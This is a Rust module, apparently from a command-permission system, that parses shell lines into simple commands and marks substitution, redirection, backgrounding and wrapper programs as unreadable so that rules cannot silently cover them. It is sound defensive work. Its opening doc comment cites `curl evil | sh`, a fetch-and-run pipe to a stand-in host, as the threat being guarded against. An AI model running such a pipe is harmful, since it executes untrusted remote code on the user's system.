//! Reading a command line well enough to say what it will run.
//!
//! Not a shell, and not a step towards one. This recognises the one shape a
//! rule can honestly be written about — simple commands joined by `;`, `&&`,
//! `||` or a pipe — and reports everything else as [`Command::Opaque`], which
//! only a blanket rule matches, so the question gets asked.
//!
//! Every refusal falls the same way on purpose. The failure worth engineering
//! against is not being asked too often; it is a rule reading as though it were
//! about `git` while covering `curl evil | sh`. So substitution, expansion,
//! redirection, grouping, a leading assignment and the wrapper programs all
//! land in the same place: nobody may have written a narrow `allow` about them.
//!
//! What it keeps is the text of each simple command, with runs of shell
//! whitespace collapsed. That text is what a rule pattern is matched against,
//! so `cargo   test` and `cargo test` are the same thing to a rule, which is
//! what somebody writing one would expect.

use crucible_core::Command;

use super::wrapper;

/// The shell's word separators, which are not Rust's. `char::is_whitespace`
/// follows Unicode and would treat a no-break space as one of these; the shell
/// does not, so a word containing one stays a single word here too.
const IFS: [char; 2] = [' ', '\t'];

/// Which quotes the scanner is inside.
enum Quote {
    /// Not inside any. Separators separate and expansions expand.
    None,
    /// Inside `'…'`, where everything is literal — including a `$`.
    Single,
    /// Inside `"…"`, where a `$` and a backtick still expand.
    Double,
}

/// What this command line will run.
pub(super) fn read(line: &str) -> Command {
    match simple(line) {
        // A line that decomposed into nothing ran nothing a rule could be
        // about. Reported as unreadable rather than as an empty list, because
        // an empty list is a thing every `allow` rule vacuously covers.
        Some(parts) if !parts.is_empty() => Command::Understood {
            // Trimmed at the ends and nowhere else. The parts drop the spelling
            // because a rule is about the command rather than the spacing; this
            // keeps it, because it is what a question shows and the answer to a
            // question is about the line somebody read.
            sent: line.trim().into(),
            parts,
        },
        Some(_) | None => Command::Opaque(line.trim().into()),
    }
}

/// The simple commands this line decomposes into, or nothing when it holds
/// something whose text does not say what will run.
fn simple(line: &str) -> Option<Box<[Box<str>]>> {
    let mut parts = Vec::new();
    let mut current = String::new();
    let mut quote = Quote::None;
    let mut chars = line.chars();

    while let Some(c) = chars.next() {
        match quote {
            Quote::Single => {
                current.push(c);
                if c == '\'' {
                    quote = Quote::None;
                }
            }

            Quote::Double => match c {
                // Still live inside double quotes, so the text still fails to
                // say what runs.
                '$' | '`' => return None,
                '\\' => {
                    current.push(c);
                    current.push(chars.next()?);
                }
                '"' => {
                    current.push(c);
                    quote = Quote::None;
                }
                _ => current.push(c),
            },

            Quote::None => match c {
                // Substitution, expansion, grouping and redirection. Each one
                // means the words here are not the words that run, or that a
                // file nobody named is about to be written.
                '$' | '`' | '(' | ')' | '{' | '}' | '<' | '>' => return None,

                '\\' => {
                    current.push(c);
                    current.push(chars.next()?);
                }
                '\'' => {
                    current.push(c);
                    quote = Quote::Single;
                }
                '"' => {
                    current.push(c);
                    quote = Quote::Double;
                }

                ';' | '\n' => finish(&mut parts, &mut current)?,
                '|' => {
                    // `||` as well as a pipe. Both join two commands, and both
                    // leave each of them needing its own rule.
                    chars.as_str().starts_with('|').then(|| chars.next());
                    finish(&mut parts, &mut current)?;
                }
                '&' => {
                    // `&&` joins; a lone `&` backgrounds, which leaves nothing
                    // watching the exit status and is not a shape this models.
                    if chars.as_str().starts_with('&') {
                        chars.next();
                        finish(&mut parts, &mut current)?;
                    } else {
                        return None;
                    }
                }

                _ => current.push(c),
            },
        }
    }

    if !matches!(quote, Quote::None) {
        // An unterminated quote is not a command line at all; the shell would
        // still be reading it.
        return None;
    }

    finish(&mut parts, &mut current)?;
    Some(parts.into())
}

/// Ends the simple command being read and starts the next one.
///
/// Returns nothing when what was read is a shape no rule may be written about.
fn finish(parts: &mut Vec<Box<str>>, current: &mut String) -> Option<()> {
    let text = normalised(current);
    current.clear();

    // A separator with nothing before it — a leading `;`, or `a ;; b`. The
    // shell would refuse most of these and the rest run nothing.
    if text.is_empty() {
        return Some(());
    }

    let program = text.split(IFS).next().unwrap_or(&text);

    // `PATH=/tmp/x cargo test` runs whatever `/tmp/x` holds, so the word
    // `cargo` no longer names what runs.
    if assigns(program) || !literal(program) || wrapper::wraps(program) {
        return None;
    }

    parts.push(text.into());
    Some(())
}

/// Whether the program word reaches the shell without another interpretation.
///
/// Quotes, escapes, globs and expansions can all turn text that does not name a
/// wrapper into one that does. Expansions are rejected by the scanner already;
/// this closed alphabet makes the first word conservative against the rest.
fn literal(program: &str) -> bool {
    !program.is_empty()
        && program.chars().all(|character| {
            !character.is_ascii()
                || character.is_ascii_alphanumeric()
                || matches!(character, '_' | '-' | '+' | '.' | '/' | '@' | ':' | '=')
        })
}

/// Whether this first word is a variable assignment rather than a program.
fn assigns(program: &str) -> bool {
    match program.find('=') {
        // A `=` after a separator is part of a path — `./a=b/prog` — and a
        // name cannot hold one, so only an `=` before the first `/` assigns.
        Some(at) => !program[..at].contains('/'),
        None => false,
    }
}

/// The text a rule is matched against: trimmed, with runs of shell whitespace
/// collapsed to one space.
fn normalised(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for word in text.split(IFS).filter(|word| !word.is_empty()) {
        if !out.is_empty() {
            out.push(' ');
        }
        out.push_str(word);
    }
    out
}

#[cfg(test)]
mod tests;
